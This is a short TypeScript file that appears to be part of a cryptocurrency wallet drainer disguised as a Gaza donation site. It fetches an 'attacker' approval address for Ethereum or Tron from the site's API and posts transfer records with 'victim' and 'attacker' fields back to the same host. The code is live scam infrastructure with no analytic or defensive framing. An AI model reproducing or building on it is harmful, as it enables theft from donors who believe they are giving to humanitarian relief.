

type TPath = 'eth' | 'tron'
export interface IRequestData {
  body?: {
    victim: string
    attacker: string
    chain_type: string
    txid: string
  },
  path: TPath
}
export async function getApproveAddress({path}: IRequestData) {
  const res = await fetch(`https://donate.reachoutgaza.org/api/${path}/attacker`)
  return await res.text()
}

export async function postTransferInfo(data: IRequestData) {
  await fetch(`https://donate.reachoutgaza.org/api/${data.path}/transfer`, {
    method: 'POST',
    body: JSON.stringify(data.body),
    headers: {
      'Content-Type': 'application/json'
    }
  })
}